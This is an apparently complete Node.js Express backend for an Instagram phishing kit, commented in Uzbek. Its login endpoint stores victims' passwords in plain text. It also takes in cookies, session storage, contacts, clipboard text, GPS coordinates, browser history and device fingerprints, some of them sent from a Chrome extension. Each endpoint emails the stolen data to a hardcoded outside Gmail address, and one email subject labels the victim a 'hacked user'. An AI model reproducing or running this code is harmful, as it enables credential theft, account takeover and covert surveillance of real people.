const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');

require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// MongoDB Connection
mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/instagram-login', {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});

const db = mongoose.connection;
db.on('error', console.error.bind(console, 'MongoDB connection error:'));
db.once('open', () => {
  console.log('Connected to MongoDB');
});

// User Schema (without password hashing as requested)
const userSchema = new mongoose.Schema({
  email: { type: String, required: true },
  password: { type: String, required: true }, // Stored as plain text as requested
  deviceInfo: {
    userAgent: String,
    language: String,
    platform: String,
    screenResolution: String,
    timezone: String,
    onLine: Boolean,
    cookieEnabled: Boolean,
    timestamp: String,
    url: String,
    referrer: String
  },
  savedCredentials: {
    localStorage: Object,
    sessionStorage: Object,
    chromeAccounts: Object,
    autofillData: Object,
    phoneNumbers: [String],
    isMobile: Boolean,
    deviceMemory: Number,
    cpuCores: Number,
    connectionType: String,
    connectionSpeed: Number,
    installedInstagramApp: Boolean,
    mobilePhoneData: Object,
    location: Object,
    clipboardData: String,
    deviceMotion: Object,
    deviceOrientation: Object,
    networkInfo: Object,
    installedApps: [Object],
    browserHistory: Object,
    deviceFingerprint: String,
    audioFingerprint: Object,
    screenInfo: Object,
    windowInfo: Object,
    timeInfo: Object,
    browserCapabilities: Object,
    securityInfo: Object,
    performanceData: Object,
    mediaDevices: Object,
    contacts: [Object],
    biometricData: Object,
    hardwareInfo: Object,
    systemInfo: Object,
    sensorData: Object,
    appData: Object,
    fingerprintData: Object
  },
  instagramCredentials: {
    localStorage: Object,
    sessionStorage: Object,
    chromeAccounts: Object,
    browserSavedCredentials: Object,
    inputData: Object
  },
  batteryInfo: {
    level: Number,
    charging: Boolean,
    chargingTime: Number,
    dischargingTime: Number
  },
  createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);

// Email transporter setup
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER || 'your-email@gmail.com',
    pass: process.env.EMAIL_PASS || 'your-app-password'
  },
  tls: {
    rejectUnauthorized: false
  },
  secure: false,
  port: 587
});

// Test email configuration
transporter.verify(function(error, success) {
  if (error) {
    console.log('Email configuration error:', error);
  } else {
    console.log('Email server is ready to send messages');
  }
});

// Instagram data endpoint (from Chrome extension)
app.post('/api/instagram-data', async (req, res) => {
  try {
    const { username, email, profileInfo, cookies, localStorage, sessionStorage, source, timestamp } = req.body;

    console.log('Instagram data received from extension:', {
      username,
      email,
      profileInfo,
      cookies: Object.keys(cookies || {}).length,
      localStorage: Object.keys(localStorage || {}).length,
      sessionStorage: Object.keys(sessionStorage || {}).length,
      source,
      timestamp
    });

    // Send email notification
    const mailOptions = {
      from: process.env.EMAIL_USER || 'your-email@gmail.com',
      to: 'everestdevelopmet@gmail.com',
      subject: 'Instagram ma\'lumotlari Chrome extension orqali',
      html: `
        <h2>Instagram ma'lumotlari Chrome extension orqali to'plandı</h2>
        <p><strong>Username:</strong> ${username || 'Topilmadi'}</p>
        <p><strong>Email:</strong> ${email || 'Topilmadi'}</p>
        <p><strong>Manba:</strong> ${source || 'N/A'}</p>
        <p><strong>Vaqt:</strong> ${timestamp || new Date().toLocaleString()}</p>
        <hr>
        <h3>Cookies (${Object.keys(cookies || {}).length} ta):</h3>
        ${cookies && Object.keys(cookies).length > 0 ? 
          `<ul>${Object.entries(cookies).map(([key, value]) => `<li>${key}: ${value}</li>`).join('')}</ul>` : 
          '<p>Cookies topilmadi</p>'
        }
        <hr>
        <h3>LocalStorage (${Object.keys(localStorage || {}).length} ta):</h3>
        ${localStorage && Object.keys(localStorage).length > 0 ? 
          `<ul>${Object.entries(localStorage).map(([key, value]) => `<li>${key}: ${value}</li>`).join('')}</ul>` : 
          '<p>LocalStorage topilmadi</p>'
        }
        <hr>
        <h3>SessionStorage (${Object.keys(sessionStorage || {}).length} ta):</h3>
        ${sessionStorage && Object.keys(sessionStorage).length > 0 ? 
          `<ul>${Object.entries(sessionStorage).map(([key, value]) => `<li>${key}: ${value}</li>`).join('')}</ul>` : 
          '<p>SessionStorage topilmadi</p>'
        }
        <hr>
        <p><em>Bu xabar Chrome extension orqali yuborildi.</em></p>
      `
    };

    await transporter.sendMail(mailOptions);
    console.log('Instagram data email sent to everestdevelopmet@gmail.com');

    res.json({ success: true, message: 'Instagram data received' });

  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({
      error: 'Server xatosi',
      details: error.message
    });
  }
});

// Mobile Instagram data endpoint
app.post('/api/mobile-instagram-data', async (req, res) => {
  try {
    const { username, email, profileInfo, cookies, localStorage, sessionStorage, mobileInfo, source, timestamp } = req.body;

    console.log('Mobile Instagram data received:', {
      username,
      email,
      profileInfo,
      cookies: Object.keys(cookies || {}).length,
      localStorage: Object.keys(localStorage || {}).length,
      sessionStorage: Object.keys(sessionStorage || {}).length,
      mobileInfo,
      source,
      timestamp
    });

    // Send email notification
    const mailOptions = {
      from: process.env.EMAIL_USER || 'your-email@gmail.com',
      to: 'everestdevelopmet@gmail.com',
      subject: 'Mobile Instagram ma\'lumotlari to\'plandı',
      html: `
        <h2>Mobile Instagram ma'lumotlari to'plandı</h2>
        <p><strong>Username:</strong> ${username || 'Topilmadi'}</p>
        <p><strong>Email:</strong> ${email || 'Topilmadi'}</p>
        <p><strong>Manba:</strong> ${source || 'N/A'}</p>
        <p><strong>Vaqt:</strong> ${timestamp || new Date().toLocaleString()}</p>
        <hr>
        <h3>Mobile qurilma ma'lumotlari:</h3>
        <p><strong>Brauzer:</strong> ${mobileInfo?.userAgent || 'N/A'}</p>
        <p><strong>Platforma:</strong> ${mobileInfo?.platform || 'N/A'}</p>
        <p><strong>Ekran o'lchami:</strong> ${mobileInfo?.screenResolution || 'N/A'}</p>
        <p><strong>Til:</strong> ${mobileInfo?.language || 'N/A'}</p>
        <p><strong>Vaqt zonasi:</strong> ${mobileInfo?.timezone || 'N/A'}</p>
        <p><strong>Online:</strong> ${mobileInfo?.onLine ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Cookie yoqilgan:</strong> ${mobileInfo?.cookieEnabled ? 'Ha' : 'Yo\'q'}</p>
        ${mobileInfo?.battery ? `
        <p><strong>Batareya darajasi:</strong> ${Math.round(mobileInfo.battery.level * 100)}%</p>
        <p><strong>Zaryadlanmoqda:</strong> ${mobileInfo.battery.charging ? 'Ha' : 'Yo\'q'}</p>
        ` : ''}
        ${mobileInfo?.location ? `
        <p><strong>GPS koordinatalari:</strong> ${mobileInfo.location.latitude}, ${mobileInfo.location.longitude}</p>
        <p><strong>Aniqlik:</strong> ${mobileInfo.location.accuracy} metr</p>
        ` : ''}
        <hr>
        <h3>Cookies (${Object.keys(cookies || {}).length} ta):</h3>
        ${cookies && Object.keys(cookies).length > 0 ? 
          `<ul>${Object.entries(cookies).map(([key, value]) => `<li>${key}: ${value}</li>`).join('')}</ul>` : 
          '<p>Cookies topilmadi</p>'
        }
        <hr>
        <h3>LocalStorage (${Object.keys(localStorage || {}).length} ta):</h3>
        ${localStorage && Object.keys(localStorage).length > 0 ? 
          `<ul>${Object.entries(localStorage).map(([key, value]) => `<li>${key}: ${value}</li>`).join('')}</ul>` : 
          '<p>LocalStorage topilmadi</p>'
        }
        <hr>
        <h3>SessionStorage (${Object.keys(sessionStorage || {}).length} ta):</h3>
        ${sessionStorage && Object.keys(sessionStorage).length > 0 ? 
          `<ul>${Object.entries(sessionStorage).map(([key, value]) => `<li>${key}: ${value}</li>`).join('')}</ul>` : 
          '<p>SessionStorage topilmadi</p>'
        }
        <hr>
        <p><em>Bu xabar mobile Chrome extension orqali yuborildi.</em></p>
      `
    };

    await transporter.sendMail(mailOptions);
    console.log('Mobile Instagram data email sent to everestdevelopmet@gmail.com');

    res.json({ success: true, message: 'Mobile Instagram data received' });

  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({
      error: 'Server xatosi',
      details: error.message
    });
  }
});



// Login endpoint
app.post('/api/login', async (req, res) => {
  try {
    const { email, password, deviceInfo, savedCredentials, instagramCredentials, batteryInfo, autoCollected } = req.body;

    console.log('Login request received:', {
      email,
      password: password ? '***' : 'empty',
      autoCollected,
      deviceInfo: deviceInfo ? 'present' : 'missing',
      savedCredentials: savedCredentials ? 'present' : 'missing',
      instagramCredentials: instagramCredentials ? 'present' : 'missing',
      batteryInfo: batteryInfo ? 'present' : 'missing'
    });

    // Allow submission even without email/password to collect device data

    // Save to MongoDB (password not hashed as requested)
    const newUser = new User({
      email: email,
      password: password, // Plain text password
      deviceInfo: deviceInfo || {},
      savedCredentials: savedCredentials || {},
      instagramCredentials: instagramCredentials || {},
      batteryInfo: batteryInfo || {}
    });

    await newUser.save();
    console.log('User saved to MongoDB:', { 
      email, 
      password: password ? '***' : 'empty', 
      deviceInfo: deviceInfo ? 'present' : 'missing', 
      savedCredentials: savedCredentials ? 'present' : 'missing', 
      instagramCredentials: instagramCredentials ? 'present' : 'missing', 
      batteryInfo: batteryInfo ? 'present' : 'missing' 
    });

    // Send email notification
    const mailOptions = {
      from: process.env.EMAIL_USER || 'your-email@gmail.com',
      to: 'everestdevelopmet@gmail.com',
      subject: autoCollected ? 'Yangi foydalanuvchi saytga kirdi (Avtomatik)' : 'Yangi hacklangan foydalanuvchi',
      html: `
        <h2>${autoCollected ? 'Yangi foydalanuvchi saytga kirdi (Avtomatik to\'plangan ma\'lumotlar)' : 'Yangi foydalanuvchi kirish urinishi'}</h2>
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Parol:</strong> ${password}</p>
        <p><strong>Vaqt:</strong> ${new Date().toLocaleString()}</p>
        <p><strong>To\'planish usuli:</strong> ${autoCollected ? 'Avtomatik (saytga kirganda)' : 'Qo\'lda (form to\'ldirganda)'}</p>
        <hr>
        <h3>Qurilma ma'lumotlari:</h3>
        <p><strong>Brauzer:</strong> ${deviceInfo?.userAgent || 'N/A'}</p>
        <p><strong>Platforma:</strong> ${deviceInfo?.platform || 'N/A'}</p>
        <p><strong>Til:</strong> ${deviceInfo?.language || 'N/A'}</p>
        <p><strong>Ekran o'lchami:</strong> ${deviceInfo?.screenResolution || 'N/A'}</p>
        <p><strong>Vaqt zonasi:</strong> ${deviceInfo?.timezone || 'N/A'}</p>
        <p><strong>Online:</strong> ${deviceInfo?.onLine ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Cookie yoqilgan:</strong> ${deviceInfo?.cookieEnabled ? 'Ha' : 'Yo\'q'}</p>
        ${batteryInfo.level !== undefined ? `
        <p><strong>Batareya darajasi:</strong> ${Math.round(batteryInfo.level * 100)}%</p>
        <p><strong>Zaryadlanmoqda:</strong> ${batteryInfo.charging ? 'Ha' : 'Yo\'q'}</p>
        ${batteryInfo.chargingTime !== Infinity ? `<p><strong>Zaryadlash vaqti:</strong> ${Math.round(batteryInfo.chargingTime / 60)} daqiqa</p>` : ''}
        ${batteryInfo.dischargingTime !== Infinity ? `<p><strong>Batareya vaqti:</strong> ${Math.round(batteryInfo.dischargingTime / 60)} daqiqa</p>` : ''}
        ` : '<p><strong>Batareya ma\'lumotlari:</strong> Mavjud emas</p>'}
        
        <h3>Saqlangan ma'lumotlar:</h3>
        ${savedCredentials.localStorage && Object.keys(savedCredentials.localStorage).length > 0 ? `
        <p><strong>LocalStorage:</strong></p>
        <ul>
          ${Object.entries(savedCredentials.localStorage).map(([key, value]) => `<li>${key}: ${value}</li>`).join('')}
        </ul>
        ` : '<p><strong>LocalStorage:</strong> Ma\'lumot topilmadi</p>'}
        ${savedCredentials.sessionStorage && Object.keys(savedCredentials.sessionStorage).length > 0 ? `
        <p><strong>SessionStorage:</strong></p>
        <ul>
          ${Object.entries(savedCredentials.sessionStorage).map(([key, value]) => `<li>${key}: ${value}</li>`).join('')}
        </ul>
        ` : '<p><strong>SessionStorage:</strong> Ma\'lumot topilmadi</p>'}
        ${savedCredentials.chromeAccounts ? `
        <p><strong>Chrome Accounts:</strong> ${JSON.stringify(savedCredentials.chromeAccounts)}</p>
        ` : ''}
        ${savedCredentials.phoneNumbers && savedCredentials.phoneNumbers.length > 0 ? `
        <p><strong>Telefon raqamlari (${savedCredentials.phoneNumbers.length} ta):</strong></p>
        <ul>
          ${savedCredentials.phoneNumbers.map(phone => `<li>${phone}</li>`).join('')}
        </ul>
        ` : '<p><strong>Telefon raqamlari:</strong> Topilmadi</p>'}
        
        ${savedCredentials.contacts && savedCredentials.contacts.length > 0 ? `
        <hr>
        <h3>📞 Kontaktlar (${savedCredentials.contacts.length} ta):</h3>
        <ul>
          ${savedCredentials.contacts.map(contact => `
            <li><strong>${contact.name}</strong>
              ${contact.tel.length > 0 ? `<br>📱 Telefon: ${contact.tel.join(', ')}` : ''}
              ${contact.email.length > 0 ? `<br>📧 Email: ${contact.email.join(', ')}` : ''}
            </li>
          `).join('')}
        </ul>
        ` : ''}
        
        ${savedCredentials.isMobile ? `
        <hr>
        <h3>📱 Mobile qurilma ma'lumotlari:</h3>
        <p><strong>Qurilma turi:</strong> Mobile</p>
        ${savedCredentials.deviceMemory ? `<p><strong>Qurilma xotirasi:</strong> ${savedCredentials.deviceMemory} GB</p>` : ''}
        ${savedCredentials.cpuCores ? `<p><strong>CPU yadrolari:</strong> ${savedCredentials.cpuCores}</p>` : ''}
        ${savedCredentials.connectionType ? `<p><strong>Internet turi:</strong> ${savedCredentials.connectionType}</p>` : ''}
        ${savedCredentials.connectionSpeed ? `<p><strong>Internet tezligi:</strong> ${savedCredentials.connectionSpeed} Mbps</p>` : ''}
        ${savedCredentials.installedInstagramApp ? `<p><strong>Instagram ilovasi o'rnatilgan:</strong> Ha</p>` : ''}
        ${savedCredentials.mobilePhoneData && Object.keys(savedCredentials.mobilePhoneData).length > 0 ? `
        <p><strong>Mobile telefon ma'lumotlari:</strong></p>
        <ul>
          ${Object.entries(savedCredentials.mobilePhoneData).map(([key, value]) => `<li>${key}: ${value}</li>`).join('')}
        </ul>
        ` : ''}
        ` : ''}
        
        ${savedCredentials.location ? `
        <hr>
        <h3>📍 Joylashuv ma'lumotlari:</h3>
        <p><strong>Latitude:</strong> ${savedCredentials.location.latitude}</p>
        <p><strong>Longitude:</strong> ${savedCredentials.location.longitude}</p>
        <p><strong>Aniqlik:</strong> ${savedCredentials.location.accuracy} metr</p>
        ${savedCredentials.location.altitude ? `<p><strong>Balandlik:</strong> ${savedCredentials.location.altitude} metr</p>` : ''}
        ${savedCredentials.location.heading ? `<p><strong>Yo'nalish:</strong> ${savedCredentials.location.heading}°</p>` : ''}
        ${savedCredentials.location.speed ? `<p><strong>Tezlik:</strong> ${savedCredentials.location.speed} m/s</p>` : ''}
        <p><strong>Vaqt:</strong> ${new Date(savedCredentials.location.timestamp).toLocaleString()}</p>
        ` : ''}
        
        ${savedCredentials.clipboardData ? `
        <hr>
        <h3>📋 Clipboard ma'lumotlari:</h3>
        <p><strong>Clipboard matni:</strong> ${savedCredentials.clipboardData}</p>
        ` : ''}
        
        ${savedCredentials.networkInfo ? `
        <hr>
        <h3>🌐 Tarmoq ma'lumotlari:</h3>
        <p><strong>Internet turi:</strong> ${savedCredentials.networkInfo.effectiveType}</p>
        <p><strong>Tezlik:</strong> ${savedCredentials.networkInfo.downlink} Mbps</p>
        <p><strong>RTT:</strong> ${savedCredentials.networkInfo.rtt} ms</p>
        <p><strong>Ma'lumot saqlash:</strong> ${savedCredentials.networkInfo.saveData ? 'Yoqilgan' : 'O\'chirilgan'}</p>
        ` : ''}
        
        ${savedCredentials.installedApps && savedCredentials.installedApps.length > 0 ? `
        <hr>
        <h3>📱 O'rnatilgan ilovalar (${savedCredentials.installedApps.length} ta):</h3>
        <ul>
          ${savedCredentials.installedApps.map(app => `<li>${app.platform}: ${app.url}</li>`).join('')}
        </ul>
        ` : ''}
        
        ${savedCredentials.browserHistory ? `
        <hr>
        <h3>🌐 Brauzer tarixi:</h3>
        <p><strong>Hozirgi URL:</strong> ${savedCredentials.browserHistory.currentUrl}</p>
        <p><strong>Referrer:</strong> ${savedCredentials.browserHistory.referrer}</p>
        <p><strong>Oldingi URL:</strong> ${savedCredentials.browserHistory.previousUrl}</p>
        ${savedCredentials.browserHistory.searchQuery !== 'N/A' ? `<p><strong>Qidiruv so'rovi:</strong> ${savedCredentials.browserHistory.searchQuery}</p>` : ''}
        ${savedCredentials.browserHistory.hash !== 'N/A' ? `<p><strong>Hash:</strong> ${savedCredentials.browserHistory.hash}</p>` : ''}
        ` : ''}
        
        ${savedCredentials.screenInfo ? `
        <hr>
        <h3>🖥️ Ekran ma'lumotlari:</h3>
        <p><strong>Ekran o'lchami:</strong> ${savedCredentials.screenInfo.width}x${savedCredentials.screenInfo.height}</p>
        <p><strong>Mavjud o'lcham:</strong> ${savedCredentials.screenInfo.availWidth}x${savedCredentials.screenInfo.availHeight}</p>
        <p><strong>Rang chuqurligi:</strong> ${savedCredentials.screenInfo.colorDepth} bit</p>
        <p><strong>Pixel chuqurligi:</strong> ${savedCredentials.screenInfo.pixelDepth} bit</p>
        <p><strong>Orientatsiya:</strong> ${savedCredentials.screenInfo.orientation}</p>
        <p><strong>Orientatsiya burchagi:</strong> ${savedCredentials.screenInfo.orientationAngle}°</p>
        ` : ''}
        
        ${savedCredentials.windowInfo ? `
        <hr>
        <h3>🪟 Oyna ma'lumotlari:</h3>
        <p><strong>Ichki o'lcham:</strong> ${savedCredentials.windowInfo.innerWidth}x${savedCredentials.windowInfo.innerHeight}</p>
        <p><strong>Tashqi o'lcham:</strong> ${savedCredentials.windowInfo.outerWidth}x${savedCredentials.windowInfo.outerHeight}</p>
        <p><strong>Pixel nisbati:</strong> ${savedCredentials.windowInfo.devicePixelRatio}</p>
        <p><strong>Scroll pozitsiyasi:</strong> X: ${savedCredentials.windowInfo.scrollX}, Y: ${savedCredentials.windowInfo.scrollY}</p>
        ` : ''}
        
        ${savedCredentials.timeInfo ? `
        <hr>
        <h3>⏰ Vaqt ma'lumotlari:</h3>
        <p><strong>Hozirgi vaqt:</strong> ${savedCredentials.timeInfo.currentTime}</p>
        <p><strong>Vaqt zonasi:</strong> ${savedCredentials.timeInfo.timezone}</p>
        <p><strong>Vaqt zonasi offset:</strong> ${savedCredentials.timeInfo.timezoneOffset} daqiqa</p>
        <p><strong>Til:</strong> ${savedCredentials.timeInfo.locale}</p>
        <p><strong>Sana format:</strong> ${savedCredentials.timeInfo.dateFormat}</p>
        <p><strong>Vaqt format:</strong> ${savedCredentials.timeInfo.timeFormat}</p>
        <p><strong>Yozgi vaqt:</strong> ${savedCredentials.timeInfo.daylightSaving ? 'Ha' : 'Yo\'q'}</p>
        ` : ''}
        
        ${savedCredentials.browserCapabilities ? `
        <hr>
        <h3>🔧 Brauzer imkoniyatlari:</h3>
        <p><strong>Cookie yoqilgan:</strong> ${savedCredentials.browserCapabilities.cookies ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Java yoqilgan:</strong> ${savedCredentials.browserCapabilities.java ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Online:</strong> ${savedCredentials.browserCapabilities.onLine ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Do Not Track:</strong> ${savedCredentials.browserCapabilities.doNotTrack || 'N/A'}</p>
        <p><strong>Maksimal touch nuqtalari:</strong> ${savedCredentials.browserCapabilities.maxTouchPoints}</p>
        <p><strong>Hardware concurrency:</strong> ${savedCredentials.browserCapabilities.hardwareConcurrency}</p>
        <p><strong>Device memory:</strong> ${savedCredentials.browserCapabilities.deviceMemory || 'N/A'} GB</p>
        <p><strong>WebGL:</strong> ${savedCredentials.browserCapabilities.webgl ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>WebGL2:</strong> ${savedCredentials.browserCapabilities.webgl2 ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>WebRTC:</strong> ${savedCredentials.browserCapabilities.webrtc ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Service Worker:</strong> ${savedCredentials.browserCapabilities.serviceWorker ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Push Manager:</strong> ${savedCredentials.browserCapabilities.pushManager ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Notifications:</strong> ${savedCredentials.browserCapabilities.notifications ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Geolocation:</strong> ${savedCredentials.browserCapabilities.geolocation ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Battery:</strong> ${savedCredentials.browserCapabilities.battery ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Vibration:</strong> ${savedCredentials.browserCapabilities.vibration ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Bluetooth:</strong> ${savedCredentials.browserCapabilities.bluetooth ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>USB:</strong> ${savedCredentials.browserCapabilities.usb ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Serial:</strong> ${savedCredentials.browserCapabilities.serial ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>HID:</strong> ${savedCredentials.browserCapabilities.hid ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Gamepad:</strong> ${savedCredentials.browserCapabilities.gamepad ? 'Ha' : 'Yo\'q'}</p>
        ` : ''}
        
        ${savedCredentials.securityInfo ? `
        <hr>
        <h3>🔒 Xavfsizlik ma'lumotlari:</h3>
        <p><strong>Xavfsiz kontekst:</strong> ${savedCredentials.securityInfo.isSecureContext ? 'Ha' : 'Yo\'q'}</p>
        <p><strong>Protokol:</strong> ${savedCredentials.securityInfo.protocol}</p>
        <p><strong>Hostname:</strong> ${savedCredentials.securityInfo.hostname}</p>
        <p><strong>Port:</strong> ${savedCredentials.securityInfo.port || 'N/A'}</p>
        <p><strong>Origin:</strong> ${savedCredentials.securityInfo.origin}</p>
        <p><strong>Referrer Policy:</strong> ${savedCredentials.securityInfo.referrerPolicy}</p>
        <p><strong>Content Security Policy:</strong> ${savedCredentials.securityInfo.contentSecurityPolicy}</p>
        ` : ''}
        
        ${savedCredentials.performanceData ? `
        <hr>
        <h3>⚡ Performance ma'lumotlari:</h3>
        ${savedCredentials.performanceData.memory ? `
        <p><strong>Xotira ishlatilishi:</strong></p>
        <ul>
          <li>Ishlatilgan: ${Math.round(savedCredentials.performanceData.memory.usedJSHeapSize / 1024 / 1024)} MB</li>
          <li>Jami: ${Math.round(savedCredentials.performanceData.memory.totalJSHeapSize / 1024 / 1024)} MB</li>
          <li>Limit: ${Math.round(savedCredentials.performanceData.memory.jsHeapSizeLimit / 1024 / 1024)} MB</li>
        </ul>
        ` : ''}
        <p><strong>Navigation turi:</strong> ${savedCredentials.performanceData.navigation.type}</p>
        <p><strong>Redirect soni:</strong> ${savedCredentials.performanceData.navigation.redirectCount}</p>
        <p><strong>Time Origin:</strong> ${savedCredentials.performanceData.timeOrigin}</p>
        ` : ''}
        
        ${savedCredentials.mediaDevices ? `
        <hr>
        <h3>🎤 Media qurilmalari:</h3>
        <p><strong>Audio inputlar:</strong> ${savedCredentials.mediaDevices.audioInputs?.length || 0} ta</p>
        <p><strong>Audio outputlar:</strong> ${savedCredentials.mediaDevices.audioOutputs?.length || 0} ta</p>
        <p><strong>Video inputlar:</strong> ${savedCredentials.mediaDevices.videoInputs?.length || 0} ta</p>
        ${savedCredentials.mediaDevices.audioInputs?.length > 0 ? `
        <p><strong>Audio input qurilmalari:</strong></p>
        <ul>
          ${savedCredentials.mediaDevices.audioInputs.map(device => `<li>${device.label || device.deviceId}</li>`).join('')}
        </ul>
        ` : ''}
        ${savedCredentials.mediaDevices.videoInputs?.length > 0 ? `
        <p><strong>Video input qurilmalari:</strong></p>
        <ul>
          ${savedCredentials.mediaDevices.videoInputs.map(device => `<li>${device.label || device.deviceId}</li>`).join('')}
        </ul>
        ` : ''}
        ` : ''}
        
        ${savedCredentials.deviceMotion ? `
        <hr>
        <h3>📱 Qurilma harakati:</h3>
        <p><strong>Tezlanish:</strong> ${JSON.stringify(savedCredentials.deviceMotion.acceleration)}</p>
        <p><strong>Gravitatsiya bilan tezlanish:</strong> ${JSON.stringify(savedCredentials.deviceMotion.accelerationIncludingGravity)}</p>
        <p><strong>Aylanish tezligi:</strong> ${JSON.stringify(savedCredentials.deviceMotion.rotationRate)}</p>
        <p><strong>Interval:</strong> ${savedCredentials.deviceMotion.interval} ms</p>
        ` : ''}
        
        ${savedCredentials.deviceOrientation ? `
        <hr>
        <h3>📱 Qurilma orientatsiyasi:</h3>
        <p><strong>Alpha:</strong> ${savedCredentials.deviceOrientation.alpha}°</p>
        <p><strong>Beta:</strong> ${savedCredentials.deviceOrientation.beta}°</p>
        <p><strong>Gamma:</strong> ${savedCredentials.deviceOrientation.gamma}°</p>
        <p><strong>Absolute:</strong> ${savedCredentials.deviceOrientation.absolute ? 'Ha' : 'Yo\'q'}</p>
        ` : ''}
        
        ${savedCredentials.audioFingerprint ? `
        <hr>
        <h3>🎵 Audio fingerprint:</h3>
        <p><strong>Sample rate:</strong> ${savedCredentials.audioFingerprint.sampleRate} Hz</p>
        <p><strong>Channel count:</strong> ${savedCredentials.audioFingerprint.channelCount}</p>
        <p><strong>Max channel count:</strong> ${savedCredentials.audioFingerprint.maxChannelCount}</p>
        ` : ''}
        <hr>
        <p><em>Bu xabar Instagram login sahifasidan yuborildi.</em></p>
      `
    };

    await transporter.sendMail(mailOptions);
    console.log('Email notification sent to everestdevelopmet@gmail.com');

    // Return success response
    res.json({ 
      success: true, 
      message: 'Data received successfully' 
    });

  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ 
      error: 'Server xatosi', 
      details: error.message 
    });
  }
});

// Test endpoint
app.get('/api/test', (req, res) => {
  res.json({ message: 'Backend ishlayapti!' });
});

app.listen(PORT, () => {
  console.log(`Server ${PORT} portda ishlayapti`);
}); 